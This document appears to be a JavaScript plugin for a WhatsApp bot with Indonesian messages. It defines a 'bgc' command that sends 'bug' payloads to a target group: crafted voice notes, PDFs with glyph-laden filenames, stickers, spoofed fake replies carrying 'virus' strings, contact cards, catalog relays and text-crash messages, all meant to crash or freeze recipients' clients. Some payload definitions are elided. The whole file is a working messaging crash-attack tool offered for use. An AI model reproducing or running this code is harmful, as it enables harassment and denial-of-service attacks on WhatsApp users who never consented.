...
let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
	...
	switch (type) {
		case 'vn': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@g.us', {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
			//await m.reply(`Berhasil Mengirim Bug Vn Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'pdf': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@g.us', {document: thumb, filename:`🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})
		...
		case 'sticker': {
			...
			conn.sendFile(text.replace(/[^0-9]/g, '') + '@g.us', stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'bugimg': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@g.us', {image: thumb, bugimage }, {quoted: bugimage})
		}
		break
		case 'bugcrash': {
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@g.us', `${virus}`, '622150996855@s.whatsapp.net', `${virus2}`, '0@s.whatsapp.net@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@g.us', `${virus}`, '622150996855@s.whatsapp.net', `${virus2}`, '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@g.us', `${virus}`, '15517868074@s.whatsapp.net', `${virus2}`, '0@broadcast')
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
		}
		break
		case 'bugkontak': {
			let res = await generateWAMessageFromContent('622150996855@s.whatsapp.net', {
				"contactMessage": {
					"vcard": "HAHaAhHAHAHA",
					"displayName": `${author}`,
					"contextInfo": {
		...
		break
		case 'reactpc': {
			await conn.sendMessage(text.replace(/[^0-9]/g, '') + '@g.us', {text: `${wm}` }, {quoted: trol})
		...
		break
		case 'bugcatalog': {
			conn.relayMessage(text.replace(/[^0-9]/g, '') + '@g.us', catalog.message, { messageId: catalog.key.id })
		}
		break
		case 'bugtextcrash': {
			conn.reply(text.replace(/[^0-9]/g, '') + '@g.us', `${wm}`, main)
		}
		break
		case 'bugvid': {
			conn.sendMessage(text.replace(/[^0-9]/g, '') + '@g.us', {video: thumb, bugimage, }, {quoted: bugimage})
		}
		break
		default:
	...
	m.reply(`Berhasil Mengirim ${type} Di Nomer +${text}`)
}

handler.help = ['bgc <idgc>']
handler.tags = ['owner']
handler.command = ['bgc']
...
let handler = async (m, {text, conn, args}) => {
  if (!args[0]) throw `Use example .bgc groupID`
  if(text == '6285270715615-1509689040@g.us') 
  text = m.sender
  const bugstik = { key: { fromMe: false, participant: `6285697835731@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": {
		"orderMessage": {
			"orderId": "594071395007984",
			"thumbnail": fs.readFileSync('./thumbnail.jpg'),
			"itemCount": fsizedoc,
  ...
  let stiker = await sticker(null, 'https://telegra.ph/file/3823f270bbd24b7746946.png', global.wm, global.author)
	conn.sendFile(text.replace(/[^0-9]/g, '') + '@g.us', stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})
  m.reply(`Bug berhasil di kirim ke Group ${text}`)
}
